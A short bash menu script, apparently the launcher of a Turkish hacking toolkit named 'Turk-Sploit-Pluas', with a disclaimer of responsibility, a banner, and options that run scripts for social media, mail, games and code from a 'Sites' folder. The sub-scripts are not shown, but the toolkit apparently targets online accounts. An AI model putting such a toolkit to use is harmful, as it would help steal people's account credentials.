#!/bin/bash
#Code : Yaman Efkar
#Youtube : YamanEfkar
#İnstagram : @turksibertimi                                                                                                                                                      #Bu toolun kullanımında meydana gelicek hiç bir şey sorumluluğumda değildir!Kişi yaptığı tüm işlerden kendisi sorumludur!
#Turk-Sploit-Pluas

banner(){
        clear
        echo -e "\033[31;40;1m

                   \e[36m           YamanEfkar
                   \e[32m*******************************
                        █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\e[31m
                        █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
                        █░░║║║╠─║─║─║║║║║╠─░░█
                        █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█\e[34m
                        █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

                   \e[31m[\e[32m01\e[31m]\e[37mSosyal Medya     \e[31m[\e[32m02\e[31m]\e[37mMail

                   \e[31m[\e[32m03\e[31m]\e[37mOyunlar          

                   \e[34m*******************************

                   \e[31m[\e[32m99\e[31m]\e[37mMenu\e[31m 

                   \e[31m[\e[32m00\e[31m]\e[37mCode           

                        "
read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' islem
}
banner
#Menu 01
if [[ $islem == 1 || $islem == 01 ]]; then
        cd Sites/
        bash sm.sh

#Menu 02
elif [[ $islem == 2 || $islem == 02 ]]; then
        cd Sites/
        bash mail.sh
#Menu 03
elif [[ $islem == 3 || $islem == 03 ]]; then
        cd Sites/
        bash game.sh
elif [[ $islem == 99 ]]; then
        cd ../ && bash tst.sh
#Menu 00
elif [[ $islem == 00 ]]; then
        cd Sites/
        bash code.sh

#Menu error
else
echo -e ""
echo -e ""
printf "\e[31m[\e[32m!\e[31m]\e[31mYanlış İşlem Numarası Girdiniz !"
sleep 3
banner
fi
